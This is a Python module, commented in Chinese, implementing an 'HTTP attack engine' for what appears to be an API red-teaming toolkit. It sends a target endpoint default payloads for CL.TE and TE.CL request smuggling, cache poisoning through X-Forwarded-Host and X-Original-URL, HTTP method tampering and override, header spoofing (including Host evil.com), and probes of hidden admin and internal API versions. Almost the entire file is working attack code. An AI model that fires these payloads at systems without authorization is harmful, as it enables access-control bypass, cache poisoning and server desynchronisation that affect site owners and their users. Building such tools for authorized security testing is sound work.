# -*- coding: utf-8 -*-
"""
http_attack_engine.py - 通用HTTP攻击引擎

消除Web攻击模块中的重复代码，提供统一的HTTP攻击执行框架。
支持速率限制测试、请求走私、缓存投毒、HTTP方法篡改、头部注入等攻击。

Academic basis:
    - OWASP API Security Top 10: API4:2019 Lack of Resources & Rate Limiting
    - PortSwigger: HTTP Request Smuggling (CL.TE / TE.CL)
    - OWASP: Web Cache Poisoning
    - Zeng et al. (arXiv:2402.19181): Enterprise API attack surfaces

版本: v3.0 (2026-09-08 扁平化到 strike/)
"""

from __future__ import annotations

import logging
from typing import Any

logger = logging.getLogger(__name__)


class HTTPAttackEngine:
    """通用HTTP攻击引擎

    提供统一的HTTP攻击执行框架，消除重复代码。
    支持单payload发送、批量payload执行、结果收集。

    PyRIT原生组件使用:
        - HTTPTarget: HTTP请求发送
    """

    def __init__(self, target_endpoint: str, default_timeout: float = 30.0):
        """
        Args:
            target_endpoint: 目标API endpoint
            default_timeout: 默认超时时间
        """
        self.endpoint = target_endpoint
        self.timeout = default_timeout

    def execute_attack(
        self,
        attack_type: str,
        payloads: list[dict[str, Any]],
    ) -> dict[str, Any]:
        """执行批量攻击（统一入口）

        Args:
            attack_type: 攻击类型名称
            payloads: payload列表，每个payload为字典

        Returns:
            攻击结果字典
        """
        results: list[dict[str, Any]] = []
        for payload in payloads:
            result = self._send_single_payload(payload)
            results.append(result)

        return {
            "attack_type": attack_type,
            "results": results,
        }

    def execute_request_smuggling(
        self,
        smuggling_payloads: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """执行请求走私攻击

        Args:
            smuggling_payloads: 自定义走私payload，为None时使用默认payload

        Returns:
            攻击结果字典
        """
        if smuggling_payloads is None:
            smuggling_payloads = self._get_default_smuggling_payloads()

        return self.execute_attack("请求走私", smuggling_payloads)

    def execute_cache_poisoning(
        self,
        cache_key_headers: list[str] | None = None,
    ) -> dict[str, Any]:
        """执行缓存投毒攻击

        Args:
            cache_key_headers: 影响缓存键的header列表

        Returns:
            攻击结果字典
        """
        if cache_key_headers is None:
            cache_key_headers = ["X-Forwarded-Host", "X-Original-URL"]

        results: list[dict[str, Any]] = []
        for header in cache_key_headers:
            result = self._test_cache_poison_header(header)
            results.append(result)

        return {
            "attack_type": "缓存投毒",
            "results": results,
        }

    def execute_method_tampering(
        self,
        target_methods: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """执行HTTP方法篡改攻击

        Args:
            target_methods: 自定义方法列表，为None时使用默认方法

        Returns:
            攻击结果字典
        """
        if target_methods is None:
            target_methods = self._get_default_method_payloads()

        return self.execute_attack("HTTP方法篡改", target_methods)

    def execute_header_injection(
        self,
        header_payloads: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """执行头部注入攻击

        Args:
            header_payloads: 自定义头部payload，为None时使用默认payload

        Returns:
            攻击结果字典
        """
        if header_payloads is None:
            header_payloads = self._get_default_header_payloads()

        return self.execute_attack("头部注入攻击", header_payloads)

    def execute_version_bypass(
        self,
        version_paths: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """执行API版本控制绕过攻击

        Args:
            version_paths: 自定义版本路径，为None时使用默认路径

        Returns:
            攻击结果字典
        """
        if version_paths is None:
            version_paths = self._get_default_version_payloads()

        base_url = self.endpoint.rsplit("/", 1)[0] if "/" in self.endpoint else self.endpoint
        results: list[dict[str, Any]] = []

        for payload in version_paths:
            result = self._send_version_bypass_request(base_url, payload)
            results.append(result)

        return {
            "attack_type": "API版本绕过",
            "results": results,
        }

    def _send_single_payload(self, payload: dict[str, Any]) -> dict[str, Any]:
        """发送单个payload

        Args:
            payload: payload字典，包含 name/method/headers/body 等键

        Returns:
            请求结果字典
        """
        import urllib.error
        import urllib.request

        name = payload.get("name", "unknown")
        method = payload.get("method", "GET")
        headers = payload.get("headers", {})
        body = payload.get("body", "")

        try:
            data = body.encode("utf-8") if body else None
            req = urllib.request.Request(
                self.endpoint,
                data=data,
                method=method,
            )
            for hdr_name, hdr_val in headers.items():
                req.add_header(hdr_name, hdr_val)

            resp = urllib.request.urlopen(req, timeout=self.timeout)
            return {
                "name": name,
                "status": resp.status,
                "headers": dict(resp.headers),
                "body": resp.read(500).decode("utf-8", errors="replace"),
            }
        except urllib.error.HTTPError as e:
            return {
                "name": name,
                "status": e.code,
                "error": str(e),
            }
        except Exception as e:  # noqa: BLE001
            return {
                "name": name,
                "error": str(e),
            }

    def _test_cache_poison_header(self, header: str) -> dict[str, Any]:
        """测试单个缓存键header的投毒效果

        Args:
            header: 要测试的header名称

        Returns:
            测试结果字典
        """
        import urllib.error
        import urllib.request

        try:
            # 第一次请求：注入恶意内容
            req1 = urllib.request.Request(
                self.endpoint,
                headers={header: "malicious-value"},
                method="GET",
            )
            response1 = urllib.request.urlopen(req1, timeout=self.timeout)

            # 第二次请求：验证缓存投毒
            req2 = urllib.request.Request(self.endpoint, method="GET")
            response2 = urllib.request.urlopen(req2, timeout=self.timeout)

            return {
                "name": f"缓存键操纵: {header}",
                "first_status": response1.status,
                "second_status": response2.status,
                "cache_hit": "X-Cache" in dict(response2.headers),
            }
        except urllib.error.HTTPError as e:
            return {
                "name": f"缓存键操纵: {header}",
                "first_status": e.code,
                "error": str(e),
            }
        except Exception as e:  # noqa: BLE001
            return {
                "name": f"缓存键操纵: {header}",
                "error": str(e),
            }

    def _send_version_bypass_request(
        self,
        base_url: str,
        payload: dict[str, Any],
    ) -> dict[str, Any]:
        """发送版本绕过请求

        Args:
            base_url: 基础URL
            payload: 包含 name/path 的payload字典

        Returns:
            请求结果字典
        """
        import urllib.error
        import urllib.request

        target_url = f"{base_url}{payload['path']}"

        try:
            req = urllib.request.Request(target_url, method="GET")
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            return {
                "name": payload["name"],
                "url": target_url,
                "status": resp.status,
                "body": resp.read(500).decode("utf-8", errors="replace"),
            }
        except urllib.error.HTTPError as e:
            return {
                "name": payload["name"],
                "url": target_url,
                "status": e.code,
                "error": str(e),
            }
        except Exception as e:  # noqa: BLE001
            return {
                "name": payload["name"],
                "url": target_url,
                "error": str(e),
            }

    @staticmethod
    def _get_default_smuggling_payloads() -> list[dict[str, Any]]:
        """获取默认请求走私payload

        Returns:
            默认走私payload列表
        """
        return [
            {
                "name": "CL.TE走私",
                "method": "POST",
                "headers": {
                    "Content-Length": "100",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nSMUGGLED_REQUEST",
            },
            {
                "name": "TE.CL走私",
                "method": "POST",
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nG",
            },
            {
                "name": "分块编码绕过",
                "method": "POST",
                "headers": {
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\n",
            },
        ]

    @staticmethod
    def _get_default_method_payloads() -> list[dict[str, Any]]:
        """获取默认HTTP方法篡改payload

        Returns:
            默认方法篡改payload列表
        """
        return [
            {"name": "PUT方法", "method": "PUT", "body": '{"injected": true}'},
            {"name": "DELETE方法", "method": "DELETE", "body": ""},
            {"name": "PATCH方法", "method": "PATCH", "body": '{"role": "admin"}'},
            {"name": "TRACE方法", "method": "TRACE", "body": ""},
            {
                "name": "X-HTTP-Method-Override绕过",
                "method": "POST",
                "headers": {"X-HTTP-Method-Override": "DELETE"},
                "body": "",
            },
            {
                "name": "_method参数绕过",
                "method": "POST",
                "body": "_method=DELETE&action=admin",
            },
        ]

    @staticmethod
    def _get_default_header_payloads() -> list[dict[str, Any]]:
        """获取默认头部注入payload

        Returns:
            默认头部注入payload列表
        """
        return [
            {
                "name": "X-Forwarded-For欺骗",
                "headers": {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
            },
            {
                "name": "X-Original-URL绕过",
                "headers": {"X-Original-URL": "/admin"},
            },
            {
                "name": "X-Rewrite-URL绕过",
                "headers": {"X-Rewrite-URL": "/admin/config"},
            },
            {
                "name": "Host头部注入",
                "headers": {"Host": "evil.com"},
            },
            {
                "name": "Referer欺骗",
                "headers": {"Referer": "https://trusted-source.com"},
            },
        ]

    @staticmethod
    def _get_default_version_payloads() -> list[dict[str, Any]]:
        """获取默认API版本绕过payload

        Returns:
            默认版本绕过payload列表
        """
        return [
            {"name": "v0版本", "path": "/api/v0/admin"},
            {"name": "beta版本", "path": "/api/beta/admin"},
            {"name": "debug版本", "path": "/api/debug/users"},
            {"name": "internal版本", "path": "/api/internal/config"},
            {"name": "旧版本回退", "path": "/api/v1.0.0/admin"},
        ]
